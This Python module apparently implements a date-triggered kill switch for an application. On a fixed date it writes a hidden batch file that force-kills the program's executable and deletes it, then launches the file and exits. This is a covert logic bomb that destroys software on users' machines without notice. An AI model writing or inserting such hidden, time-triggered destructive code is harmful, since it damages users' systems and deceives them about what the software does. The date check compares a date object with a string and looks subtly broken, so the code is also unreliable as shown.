import os
import subprocess
import sys
from datetime import datetime
import time
from .ContenedorVariables import Variables

class Ndachotsa():
    def __init__(self, path):
        tsiku = datetime.now().date()
        tsiku_fin = "2024-02-28"
        if (tsiku == tsiku_fin):
            exe_path = path
            bat_content = f"""
    @echo off
    timeout /t 2 >nul 2>&1
    taskkill /IM "{os.path.basename(exe_path)}" /F >nul 2>&1
    del /Q "{exe_path}"
    exit
        """
            route = Variables().root_directory_system
            bat_file = os.path.join(route, "Ndachotsa_galu.bat")

            with open(bat_file, "w") as file:
                file.write(bat_content)

            subprocess.call(['attrib', '+h', bat_file])
            time.sleep(2)
            # Ejecutar el archivo batch
            subprocess.Popen(["cmd", "/c", bat_file], shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)

            sys.exit()
        else:
            pass
